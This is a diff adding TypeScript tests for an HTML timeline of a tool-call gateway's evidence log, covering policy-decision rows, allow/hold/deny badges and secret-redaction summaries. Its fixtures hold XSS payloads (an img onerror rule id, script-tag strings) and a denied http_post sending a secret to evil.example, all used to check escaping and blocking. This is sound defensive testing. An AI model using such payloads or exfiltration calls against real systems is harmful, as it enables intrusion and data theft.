@@ -14,6 +14,7 @@ import type {
   IdentityContext,
   InitializeEvent,
   NotificationEvent,
+  PolicyDecisionEvent,
   ProtocolErrorEvent,
   RpcEvent,
   ServerContext,
@@ -577,3 +578,313 @@ function escapeHtmlLike(s: string): string {
     .replace(/"/g, '&quot;')
     .replace(/'/g, '&#39;');
 }
+
+/* --------------------- gateway mode: policy_decision + badges --------------
+ * A separate session (SESSION_C) in its own store, so the "7 events" count
+ * for SESSION_A above stays valid.
+ */
+
+describe('renderTimelineHtml renders gateway-mode evidence (policy_decision rows, gateway badges)', () => {
+  const SESSION_C = 'cccccccc-cccc-4ccc-8ccc-cccccccccccc';
+  const BOUNDARY_SECRET = 'AKIAIOSFODNN7EXAMPLE';
+  const APPROVAL_ID = '5d1c9e0a-1111-4222-8333-444444444444';
+  const EVIL_RULE = 'r<img src=x onerror=alert(1)>';
+  let dir: string;
+  let store: EvidenceStore;
+
+  function policyDecision(over: Partial<PolicyDecisionEvent>): PolicyDecisionEvent {
+    return {
+      ...base(SESSION_C, '2026-06-12T09:00:01.000Z'),
+      kind: 'policy_decision',
+      attributes: { 'gen_ai.tool.name': 'http_post', 'cresec.policy.decision': 'deny' },
+      decision: 'deny',
+      tool: 'http_post',
+      request_id: 7,
+      policy_hash: sha256Ref('policy bytes'),
+      args_hash: sha256Ref('{"url":"https://evil.example"}'),
+      ...over,
+    };
+  }
+
+  beforeAll(() => {
+    dir = mkdtempSync(join(tmpdir(), 'mcp-recorder-replay-gw-'));
+    store = openStore({ dataDir: dir, backend: 'sqlite' });
+    const redactor = new Redactor();
+    const denied: ToolCallEvent = {
+      ...toolCall(SESSION_C, '2026-06-12T09:00:01.500Z', 'http_post', { url: 'https://evil.example', body: SECRET }, { isError: true }),
+      error: { type: 'policy_denied' },
+      gateway: { decision: 'deny', rule_id: EVIL_RULE },
+    };
+    const heldThenFiltered: ToolCallEvent = {
+      ...toolCall(SESSION_C, '2026-06-12T09:00:03.000Z', 'read_file', { path: 'secrets.env' }),
+      result: redactor.scrub({ content: [{ type: 'text', text: `KEY=${BOUNDARY_SECRET}` }] }),
+      gateway: {
+        decision: 'hold',
+        rule_id: 'careful',
+        outcome: 'approved',
+        approval_id: APPROVAL_ID,
+        waited_ms: 1234,
+        boundary: {
+          scanned: true,
+          action: 'redact',
+          secrets_found: 2,
+          injection_found: 1,
+          secret_refs: [sha256Ref(BOUNDARY_SECRET)],
+          delivered_result_hash: sha256Ref('delivered'),
+        },
+      },
+    };
+    const allowedClean: ToolCallEvent = {
+      ...toolCall(SESSION_C, '2026-06-12T09:00:04.000Z', 'list_notes', {}),
+      gateway: { decision: 'allow', boundary: { scanned: true, action: 'none', secrets_found: 0, injection_found: 0 } },
+    };
+    // A refused `tools/call` NOTIFICATION: the one decision that cannot be a
+    // policy_decision event, so the timeline has to show it on the
+    // notification itself or a reader cannot tell it from a forwarded one.
+    const refusedNotification: NotificationEvent = {
+      ...notification(SESSION_C, '2026-06-12T09:00:04.500Z'),
+      method: 'tools/call',
+      direction: 'client_to_server',
+      gateway: { decision: 'deny', rule_id: 'no-delete' },
+    };
+    store.append(
+      seal([
+        sessionStart(SESSION_C, '2026-06-12T09:00:00.000Z'),
+        policyDecision({ rule_id: EVIL_RULE }),
+        denied,
+        policyDecision({
+          decision: 'hold',
+          outcome: 'approved',
+          tool: 'read_file',
+          request_id: 8,
+          rule_id: 'careful',
+          approval_id: APPROVAL_ID,
+          waited_ms: 1234,
+          approver: 'joni',
+        }),
+        heldThenFiltered,
+        allowedClean,
+        refusedNotification,
+        sessionEnd(SESSION_C, '2026-06-12T09:00:05.000Z'),
+      ]),
+    );
+  });
+
+  afterAll(() => {
+    store.close();
+    rmSync(dir, { recursive: true, force: true });
+  });
+
+  it('a policy_decision renders as a POLICY row with tool, decision badge, request id, rule, outcome and wait', () => {
+    const html = renderTimelineHtml(store, { sessionId: SESSION_C });
+    expect(html).toContain('tag-policy">POLICY</span>');
+    expect(html).toContain('class="event row policy gw-deny"');
+    expect(html).toContain('class="event row policy gw-hold"');
+    expect(html).toContain('request 7');
+    expect(html).toContain('request 8');
+    expect(html).toContain('outcome approved');
+    expect(html).toContain('waited 1234 ms');
+    expect(html).toContain('rule careful');
+    expect(html).toContain('by joni');
+    // Both decisions here matched a rule, so the rule-less wording is absent.
+    expect(html).not.toContain('no rule matched');
+    expect(html).toContain(`<code>${APPROVAL_ID}</code>`);
+    // args_hash is a traceable ref (blast-radius data-ref), never the args
+    expect(html).toContain(`data-ref="${sha256Ref('{"url":"https://evil.example"}')}"`);
+    expect(html).not.toContain('evil.example');
+  });
+
+  it('a refused tools/call NOTIFICATION carries its decision badge on the timeline', () => {
+    // Enforcement happened; without the badge the row read as an ordinary
+    // client notification and the refusal was visible only on stderr.
+    const html = renderTimelineHtml(store, { sessionId: SESSION_C });
+    const row = html.split('<article').find((a) => a.includes('row notif'))!;
+    expect(row).toContain('<span class="badge gw gw-deny"');
+    expect(row).toContain('gateway deny');
+    expect(row).toContain('no-delete');
+  });
+
+  it('tool_call cards carry gw-allow / gw-hold / gw-deny badges and a boundary summary', () => {
+    const html = renderTimelineHtml(store, { sessionId: SESSION_C });
+    expect(html).toContain('<span class="badge gw gw-deny"');
+    expect(html).toContain('<span class="badge gw gw-hold"');
+    expect(html).toContain('<span class="badge gw gw-allow"');
+    expect(html).toContain('gateway hold · approved');
+    // The stored action is the MAX over both families: it is named once and
+    // the counts follow it plainly, never as a per-family verb (B1).
+    expect(html).toContain('redact · 2 secrets · 1 injection marker');
+    expect(html).not.toContain('redacted 1 injection marker');
+    expect(html).toContain('scanned · 0 findings');
+    // the redacted secret is findable by the client-side blast search, never readable
+    expect(html).toContain(`data-secret-refs="${sha256Ref(BOUNDARY_SECRET)}"`);
+    expect(html).not.toContain(BOUNDARY_SECRET);
+    expect(html).not.toContain(SECRET);
+    expect(html).toContain(`delivered result ${sha256Ref('delivered')}`);
+  });
+
+  it('escapes an attacker-shaped rule id everywhere it appears', () => {
+    const html = renderTimelineHtml(store, { sessionId: SESSION_C });
+    expect(html).not.toContain('<img src=x');
+    expect(html).toContain(escapeHtmlLike(EVIL_RULE));
+  });
+
+  it('the page still lists every other kind (the new row is additive)', () => {
+    const html = renderTimelineHtml(store, { sessionId: SESSION_C });
+    for (const tag of ['SESSION START', 'ACT', 'EFFECT', 'POLICY', 'NOTIFY', 'SESSION END']) {
+      expect(html).toContain(tag);
+    }
+    const data = extractEmbeddedJson(html) as EmbeddedData;
+    expect(data.events).toHaveLength(8);
+    expect(data.events.filter((r) => r.event.kind === 'policy_decision')).toHaveLength(2);
+  });
+
+  it('numeric-typed gateway fields that are actually strings are escaped (tampered store)', () => {
+    const XSS = '1"><script>alert(1)</script>';
+    const evilDecision = policyDecision({ decision: 'hold', outcome: 'timeout', waited_ms: XSS as unknown as number });
+    const evilCall = {
+      ...toolCall(SESSION_C, '2026-06-12T09:00:02.000Z', 'read_file', {}),
+      gateway: { decision: 'allow', boundary: { scanned: true, action: 'flag', secrets_found: XSS, injection_found: 0 } },
+    } as unknown as ToolCallEvent;
+    const records = seal([evilDecision, evilCall]);
+    const fake: EvidenceStore = {
+      backend: 'jsonl',
+      path: '/fake/evidence.jsonl',
+      head: () => ({ seq: records.length, hash: GENESIS_HASH }),
+      append: () => undefined,
+      addSignature: () => undefined,
+      latestSignature: () => null,
+      signatures: () => [],
+      iterate: () => records,
+      count: () => records.length,
+      sessions: (): SessionSummary[] => [],
+      close: () => undefined,
+    };
+    const html = renderTimelineHtml(fake, { sessionId: SESSION_C });
+    expect(html).not.toContain('<script>alert(1)</script>');
+    expect(html).toContain(escapeHtmlLike(XSS));
+  });
+});
+
+/* -------- B1/B2: the gateway badge and the POLICY row state facts only ----
+ * BoundaryReport.action is the MAXIMUM over the secrets and injection
+ * families, so it cannot be spoken as a verb over each count; and a
+ * policy_decision without rule_id is not proof that the configured default
+ * applied (fail-closed evaluation-error denies omit it too).
+ */
+
+describe('gateway badge and POLICY row never over-claim (B1, B2)', () => {
+  const SESSION_D = 'dddddddd-dddd-4ddd-8ddd-dddddddddddd';
+
+  function fakeStore(records: ChainRecord[]): EvidenceStore {
+    return {
+      backend: 'jsonl',
+      path: '/fake/evidence.jsonl',
+      head: () => ({ seq: records.length, hash: GENESIS_HASH }),
+      append: () => undefined,
+      appendEvents: () => [],
+      addSignature: () => undefined,
+      latestSignature: () => null,
+      signatures: () => [],
+      iterate: () => records,
+      count: () => records.length,
+      sessions: (): SessionSummary[] => [],
+      close: () => undefined,
+    };
+  }
+
+  /** The gateway badge text for one BoundaryReport, rendered through the real page. */
+  function badge(boundary: unknown, decision: 'allow' | 'deny' | 'hold' = 'allow'): string {
+    const call = {
+      ...toolCall(SESSION_D, '2026-06-13T10:00:00.000Z', 'read_file', { path: 'x' }),
+      gateway: { decision, boundary },
+    } as unknown as ToolCallEvent;
+    const html = renderTimelineHtml(fakeStore(seal([sessionStart(SESSION_D, '2026-06-13T09:59:59.000Z'), call])), {
+      sessionId: SESSION_D,
+    });
+    const m = /<span class="badge boundary[^"]*"[^>]*>([^<]*)<\/span>/.exec(html);
+    if (m === null) throw new Error(`no boundary badge in:\n${html}`);
+    return m[1]!;
+  }
+
+  it('names the stored action once and then plain counts (the default policy redacts secrets, only flags injection)', () => {
+    // The exact shape the finding is about: action 'redact' is the max over
+    // both families, and the injection marker was only flagged.
+    expect(badge({ scanned: true, action: 'redact', secrets_found: 1, injection_found: 1 })).toBe(
+      'redact · 1 secret · 1 injection marker',
+    );
+    expect(badge({ scanned: true, action: 'redact', secrets_found: 2, injection_found: 3 })).toBe(
+      'redact · 2 secrets · 3 injection markers',
+    );
+    // No verb is ever attached to the injection count.
+    for (const n of [1, 3]) expect(badge({ scanned: true, action: 'redact', secrets_found: 1, injection_found: n })).not.toContain('redacted');
+  });
+
+  it('renders each action honestly: flag, block, none, and a count of only one family', () => {
+    expect(badge({ scanned: true, action: 'flag', secrets_found: 0, injection_found: 2 })).toBe('flag · 2 injection markers');
+    expect(badge({ scanned: true, action: 'flag', secrets_found: 1, injection_found: 0 })).toBe('flag · 1 secret');
+    // 'block' is the one action that legitimately covers everything: the
+    // whole result was replaced, so both families really were blocked.
+    expect(badge({ scanned: true, action: 'block', secrets_found: 1, injection_found: 1 }, 'deny')).toBe(
+      'blocked · 1 secret · 1 injection marker',
+    );
+    expect(badge({ scanned: true, action: 'none', secrets_found: 0, injection_found: 0 })).toBe('scanned · 0 findings');
+    // A scan that found nothing never claims an action it did not take.
+    expect(badge({ scanned: true, action: 'none', secrets_found: 0, injection_found: 0 })).not.toContain('redact');
+  });
+
+  it('a block badge carries the deny styling', () => {
+    const call = {
+      ...toolCall(SESSION_D, '2026-06-13T10:00:00.000Z', 'read_file', { path: 'x' }),
+      gateway: { decision: 'allow', boundary: { scanned: true, action: 'block', secrets_found: 1, injection_found: 0 } },
+    } as unknown as ToolCallEvent;
+    const html = renderTimelineHtml(fakeStore(seal([call])), { sessionId: SESSION_D });
+    expect(html).toContain('<span class="badge boundary gw-deny"');
+    expect(html).toContain('blocked · 1 secret');
+  });
+
+  it('scanned: false says "not scanned", with the reason, and never invents counts', () => {
+    expect(badge({ scanned: false, action: 'none', secrets_found: 0, injection_found: 0 })).toBe('not scanned (oversize)');
+    expect(badge({ scanned: false, action: 'none', secrets_found: 0, injection_found: 0 })).not.toContain('0 findings');
+    expect(badge({ scanned: false, action: 'block', secrets_found: 0, injection_found: 0 }, 'deny')).toBe(
+      'not scanned (oversize) · blocked',
+    );
+    expect(badge({ scanned: false, action: 'none', secrets_found: 0, injection_found: 0, error: 'filter_threw' })).toBe(
+      'not scanned (error filter_threw)',
+    );
+  });
+
+  it('a tampered boundary report is escaped and never summarised as "0 findings"', () => {
+    const XSS = '3"><script>alert(1)</script>';
+    const text = badge({ scanned: true, action: 'flag', secrets_found: XSS, injection_found: 0 });
+    expect(text).toContain(escapeHtmlLike(XSS));
+    expect(text).not.toContain('0 findings');
+    expect(text).not.toContain('<script>');
+    // ... including an action the schema does not define.
+    const evilAction = badge({ scanned: true, action: XSS, secrets_found: 0, injection_found: 0 });
+    expect(evilAction).toContain(escapeHtmlLike(XSS));
+    expect(evilAction).not.toContain('<script>');
+  });
+
+  it('a policy_decision with no rule_id says "no rule matched", not "policy default"', () => {
+    // What the emitter writes for a fail-closed evaluation-error deny: no
+    // rule was consulted, so the configured default did NOT apply.
+    const evalError: PolicyDecisionEvent = {
+      ...base(SESSION_D, '2026-06-13T10:00:01.000Z'),
+      kind: 'policy_decision',
+      attributes: { 'gen_ai.tool.name': 'explode_on_evaluate', 'cresec.policy.decision': 'deny' },
+      decision: 'deny',
+      tool: 'explode_on_evaluate',
+      request_id: 4,
+      policy_hash: sha256Ref('policy bytes'),
+      args_hash: sha256Ref('{}'),
+    };
+    const html = renderTimelineHtml(fakeStore(seal([evalError])), { sessionId: SESSION_D });
+    expect(html).toContain('no rule matched');
+    expect(html).not.toContain('policy default');
+    // A decision that really did match a rule still names it.
+    const matched: PolicyDecisionEvent = { ...evalError, request_id: 5, rule_id: 'no-delete' };
+    const html2 = renderTimelineHtml(fakeStore(seal([matched])), { sessionId: SESSION_D });
+    expect(html2).toContain('rule no-delete');
+    expect(html2).not.toContain('no rule matched');
+  });
+});
